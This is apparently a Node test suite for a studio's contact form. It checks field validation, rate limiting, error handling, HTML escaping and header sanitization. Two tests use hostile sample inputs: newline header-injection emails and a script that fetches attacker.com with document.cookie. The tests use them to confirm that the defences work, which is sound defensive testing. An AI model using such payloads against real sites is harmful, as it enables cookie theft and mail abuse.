import test from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, sanitizeHeader } from "../src/lib/email.ts";
import {
  validateContactInput,
  validatePhoneNumber,
  checkRateLimit,
  resetRateLimits,
  handleFrontendSubmissionResponse,
  EMAIL_RFC_REGEX,
} from "../src/lib/contact-validator.ts";

// -----------------------------------------------------------------------------
// 1. Successful Input Validation
// -----------------------------------------------------------------------------
test("1. Successful Input Validation: accepts valid client enquiry with phone number & preferred contact method", () => {
  const validPayload = {
    name: "  Sarah Connor  ",
    businessName: "  Cyberdyne Systems  ",
    email: "  sarah.connor@cyberdyne.co.uk  ",
    phone: "  +91 91367 30898  ",
    service: "Full-Stack Web Application",
    budget: "₹75,000 - ₹1,75,000 ($900 - $2,100)",
    details: "We require a robust Next.js platform with secure role-based authentication and payment checkout.",
    preferredContactMethod: "WhatsApp",
    consent: true,
  };

  const result = validateContactInput(validPayload);
  assert.equal(result.isValid, true, "Validation should pass for valid input");
  assert.equal(Object.keys(result.errors).length, 0, "There should be no errors");
  assert.ok(result.sanitized);
  assert.equal(result.sanitized.name, "Sarah Connor", "Name should be trimmed");
  assert.equal(result.sanitized.email, "sarah.connor@cyberdyne.co.uk", "Email should be trimmed");
  assert.equal(result.sanitized.phone, "+91 91367 30898", "Phone should be trimmed but preserve original formatting");
  assert.equal(result.sanitized.businessName, "Cyberdyne Systems");
  assert.equal(result.sanitized.service, "Full-Stack Web Application");
  assert.equal(result.sanitized.preferredContactMethod, "WhatsApp");
  assert.equal(result.sanitized.consent, true);
});

// -----------------------------------------------------------------------------
// 2. Phone Number Validation (Indian & International)
// -----------------------------------------------------------------------------
test("2. Phone Number Validation: accepts Indian & international formats with country codes, rejects invalid formats", () => {
  const validPhones = [
    "+91 9136730898",
    "+91 91367 30898",
    "+91-91367-30898",
    "9136730898",
    "09136730898",
    "+1 (555) 234-5678",
    "+44 7911 123456",
    "+971 50 123 4567",
    "+61 412 345 678",
    "+49 30 1234567",
  ];

  for (const phone of validPhones) {
    const res = validatePhoneNumber(phone);
    assert.equal(res.isValid, true, `Phone should be valid: ${phone}`);
  }

  const invalidPhones = [
    "", // Empty
    "   ",
    "12345", // Too short (< 7 digits)
    "abcdefghij", // Letters
    "+91 abc 12345", // Letters mixed
    "12345678901234567", // Too long (> 15 digits)
    "0000000000", // Repetitive dummy number
    "1111111111", // Repetitive dummy number
  ];

  for (const phone of invalidPhones) {
    const res = validatePhoneNumber(phone);
    assert.equal(res.isValid, false, `Phone should be rejected: ${phone}`);
    assert.ok(res.error, `Error message must be present for: ${phone}`);
  }
});

// -----------------------------------------------------------------------------
// 3. Missing Required Fields
// -----------------------------------------------------------------------------
test("3. Missing Required Fields: correctly flags missing name, email, phone, service, details, and consent", () => {
  // Empty payload
  const emptyResult = validateContactInput({});
  assert.equal(emptyResult.isValid, false);
  assert.ok(emptyResult.errors.name, "Must flag missing name");
  assert.ok(emptyResult.errors.email, "Must flag missing email");
  assert.ok(emptyResult.errors.phone, "Must flag missing phone");
  assert.ok(emptyResult.errors.service, "Must flag missing service");
  assert.ok(emptyResult.errors.details, "Must flag missing details");
  assert.ok(emptyResult.errors.consent, "Must flag missing consent");

  // Name too short (< 2 chars)
  const shortNameResult = validateContactInput({
    name: "A",
    email: "valid@webstix.studio",
    phone: "+91 9136730898",
    service: "Website Design & Development",
    details: "This is a detailed description of the project.",
    preferredContactMethod: "WhatsApp",
    consent: true,
  });
  assert.equal(shortNameResult.isValid, false);
  assert.ok(shortNameResult.errors.name);

  // Details too short (< 10 chars)
  const shortDetailsResult = validateContactInput({
    name: "Alex Morgan",
    email: "valid@webstix.studio",
    phone: "+91 9136730898",
    service: "Website Design & Development",
    details: "Too short",
    preferredContactMethod: "WhatsApp",
    consent: true,
  });
  assert.equal(shortDetailsResult.isValid, false);
  assert.ok(shortDetailsResult.errors.details);

  // Consent is false
  const noConsentResult = validateContactInput({
    name: "Alex Morgan",
    email: "valid@webstix.studio",
    phone: "+91 9136730898",
    service: "Website Design & Development",
    details: "This is a detailed description of the project.",
    preferredContactMethod: "WhatsApp",
    consent: false,
  });
  assert.equal(noConsentResult.isValid, false);
  assert.ok(noConsentResult.errors.consent);
});

// -----------------------------------------------------------------------------
// 4. Invalid Email Addresses
// -----------------------------------------------------------------------------
test("4. Invalid Email Addresses: rejects malformed emails, spaces, and header injection attempts", () => {
  const invalidEmails = [
    "plainaddress",
    "#@%^%#$@#$@#.com",
    "@missingusername.com",
    "missingdomain@.com",
    "two@@signs.com",
    "spaces in@address.com",
    "trailingdot.@domain.com",
    "injected\r\ncc:hacker@evil.com",
    "injected\nbcc:hacker@evil.com",
  ];

  for (const badEmail of invalidEmails) {
    const result = validateContactInput({
      name: "Test User",
      email: badEmail,
      phone: "+91 9136730898",
      service: "Website Design & Development",
      details: "Looking for an e-commerce storefront for retail products.",
      preferredContactMethod: "WhatsApp",
      consent: true,
    });
    assert.equal(result.isValid, false, `Expected ${badEmail} to be rejected`);
    assert.ok(result.errors.email, `Expected error on email field for: ${badEmail}`);
  }

  // Valid RFC email examples must pass
  const validEmails = [
    "user@example.com",
    "vinit.gohil@webstix.studio",
    "riddhi+portfolio@domain.co.in",
    "customer.support_12@sub.domain.org",
  ];
  for (const goodEmail of validEmails) {
    assert.equal(EMAIL_RFC_REGEX.test(goodEmail), true, `Expected valid: ${goodEmail}`);
  }
});

// -----------------------------------------------------------------------------
// 5. Preferred Contact Method Validation
// -----------------------------------------------------------------------------
test("5. Preferred Contact Method: validates Email, WhatsApp, and Phone Call, rejects invalid options", () => {
  for (const method of ["WhatsApp", "Email", "Phone Call"]) {
    const res = validateContactInput({
      name: "Alex Morgan",
      email: "alex@example.com",
      phone: "+91 9136730898",
      service: "Website Design & Development",
      details: "Need a high converting website for modern brand.",
      preferredContactMethod: method,
      consent: true,
    });
    assert.equal(res.isValid, true, `Method ${method} should be accepted`);
    assert.equal(res.sanitized?.preferredContactMethod, method);
  }

  const badMethodResult = validateContactInput({
    name: "Alex Morgan",
    email: "alex@example.com",
    phone: "+91 9136730898",
    service: "Website Design & Development",
    details: "Need a high converting website for modern brand.",
    preferredContactMethod: "Carrier Pigeon",
    consent: true,
  });
  assert.equal(badMethodResult.isValid, false);
  assert.ok(badMethodResult.errors.preferredContactMethod);
});

// -----------------------------------------------------------------------------
// 6. Rate-Limited Submissions
// -----------------------------------------------------------------------------
test("6. Rate-Limited Submissions: enforces sliding window and blocks excessive requests with retry-after", () => {
  resetRateLimits();
  const testIp = "198.51.100.42";

  // Requests 1 through 5 should be allowed
  for (let i = 1; i <= 5; i++) {
    const check = checkRateLimit(testIp, 5, 600000);
    assert.equal(check.allowed, true, `Request #${i} should be permitted`);
    assert.equal(check.currentCount, i);
  }

  // 6th request from same IP must be rate-limited
  const blockedCheck = checkRateLimit(testIp, 5, 600000);
  assert.equal(blockedCheck.allowed, false, "6th request should be blocked by rate limiter");
  assert.ok(blockedCheck.retryAfterSeconds && blockedCheck.retryAfterSeconds > 0, "Must provide retryAfterSeconds");

  // Different IP should still be allowed
  const differentIpCheck = checkRateLimit("203.0.113.88", 5, 600000);
  assert.equal(differentIpCheck.allowed, true, "Independent IP should not be blocked");

  resetRateLimits();
});

// -----------------------------------------------------------------------------
// 7. Email Provider Failures Handling
// -----------------------------------------------------------------------------
test("7. Email Provider Failures: simulates transporter errors and ensures safe, non-leaking responses", () => {
  function simulateProviderDispatch(mockError) {
    try {
      if (mockError) {
        throw new Error(mockError);
      }
      return { success: true, messageId: "<simulated@webstix.studio>" };
    } catch {
      const sanitizedClientResponse = {
        success: false,
        error: "We could not deliver your message due to an email server error. Please try again or email hello.webstix@gmail.com directly.",
        code: "EMAIL_DELIVERY_FAILED",
      };
      return sanitizedClientResponse;
    }
  }

  const failure = simulateProviderDispatch("535-5.7.8 Username and Password not accepted / auth token leak test");
  assert.equal(failure.success, false);
  assert.equal(failure.code, "EMAIL_DELIVERY_FAILED");
  // Ensure no password or internal error trace is leaked in client response
  assert.equal(failure.error.includes("535-5.7.8"), false);
  assert.equal(failure.error.includes("Password"), false);
});

// -----------------------------------------------------------------------------
// 8. HTML Escaping & Header Injection Protection
// -----------------------------------------------------------------------------
test("8. HTML Escaping & Header Sanitization: prevents XSS injection and newline injection", () => {
  const xssAttempt = `<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script><strong>Bold</strong> & "quotes"`;
  const escaped = escapeHtml(xssAttempt);

  assert.equal(escaped.includes("<script>"), false, "Must escape opening script tags");
  assert.equal(escaped.includes("</script>"), false, "Must escape closing script tags");
  assert.equal(escaped.includes("&lt;script&gt;"), true);
  assert.equal(escaped.includes("&quot;quotes&quot;"), true);
  assert.equal(escaped.includes("&amp;"), true);

  const headerInjection = "E-Commerce\r\nBcc: spy@attacker.com\nSubject: Injected Subject";
  const sanitized = sanitizeHeader(headerInjection);
  assert.equal(sanitized.includes("\r"), false, "Must strip carriage returns");
  assert.equal(sanitized.includes("\n"), false, "Must strip newlines");
  assert.equal(sanitized, "E-Commerce  Bcc: spy@attacker.com Subject: Injected Subject");
});

// -----------------------------------------------------------------------------
// 9. Successful Frontend Submission
// -----------------------------------------------------------------------------
test("9. Successful Frontend Submission: displays exact required message, reference ID, and resets form", () => {
  const currentFormData = {
    name: "Alex Morgan",
    businessName: "Acme",
    email: "alex@example.com",
    phone: "+91 9136730898",
    service: "Full-Stack Web Application",
    details: "Need a modern client portal with real-time analytics.",
    preferredContactMethod: "WhatsApp",
    consent: true,
  };

  const simulatedApiSuccess = {
    success: true,
    message: "Thank you for contacting Webstix! Your enquiry has been delivered to our team.",
    referenceId: "WSX-TESTREF-1234",
  };

  const { result, preservedForm } = handleFrontendSubmissionResponse(200, simulatedApiSuccess, currentFormData);

  assert.equal(result.success, true);
  assert.equal(
    result.message,
    "Thank you for contacting Webstix! Your enquiry has been delivered to our team."
  );
  assert.equal(result.referenceId, "WSX-TESTREF-1234");
  assert.equal(result.formReset, true, "Form must be reset upon confirmed successful delivery");
  assert.equal(preservedForm, null, "Preserved form should be cleared after success");
});

// -----------------------------------------------------------------------------
// 10. Failed Frontend Submission
// -----------------------------------------------------------------------------
test("10. Failed Frontend Submission: preserves user input, reports error, allows retry, and never shows false success", () => {
  const currentFormData = {
    name: "Alex Morgan",
    businessName: "Acme",
    email: "alex@example.com",
    phone: "+91 9136730898",
    service: "Full-Stack Web Application",
    details: "Need a modern client portal with real-time analytics.",
    preferredContactMethod: "WhatsApp",
    consent: true,
  };

  // Case A: 422 Validation Error
  const validationErrorResponse = {
    success: false,
    error: "Validation failed. Please correct the highlighted errors.",
    fields: { email: "Please enter a valid, well-formed email address." },
  };
  const validationResult = handleFrontendSubmissionResponse(422, validationErrorResponse, currentFormData);

  assert.equal(validationResult.result.success, false, "Must not indicate success on failure");
  assert.equal(validationResult.result.formReset, false, "Form must NOT be reset on validation failure");
  assert.deepEqual(validationResult.preservedForm, currentFormData, "User input must be strictly preserved for retry");
  assert.equal(validationResult.result.fieldErrors?.email, "Please enter a valid, well-formed email address.");

  // Case B: 500 Server / Email Provider Error
  const serverErrorResponse = {
    success: false,
    error: "We could not deliver your message due to an email server error. Please try again or email hello.webstix@gmail.com directly.",
  };
  const serverResult = handleFrontendSubmissionResponse(500, serverErrorResponse, currentFormData);

  assert.equal(serverResult.result.success, false);
  assert.equal(serverResult.result.formReset, false, "Form must NOT be reset on server error");
  assert.deepEqual(serverResult.preservedForm, currentFormData, "User input must be preserved");

  // Case C: False positive prevention (if backend returns success: false with 200)
  const deceptiveResponse = { success: false, error: "Suspicious activity detected." };
  const deceptiveResult = handleFrontendSubmissionResponse(200, deceptiveResponse, currentFormData);
  assert.equal(deceptiveResult.result.success, false, "Never show false positive success");
});

// -----------------------------------------------------------------------------
// 11. Anti-Bot Honeypot Test
// -----------------------------------------------------------------------------
test("11. Anti-Bot Honeypot: rejects submission when invisible honeypot field is filled", () => {
  const botPayload = {
    name: "Spam Bot",
    email: "bot@spammer.com",
    phone: "+91 9136730898",
    service: "Website Design & Development",
    details: "Buy cheap backlinks here!",
    preferredContactMethod: "WhatsApp",
    consent: true,
    honeypot: "I am a spam bot filling all inputs",
  };

  const result = validateContactInput(botPayload);
  assert.equal(result.isValid, false);
  assert.equal(result.isSpamBot, true);
  assert.ok(result.errors.honeypot);
});
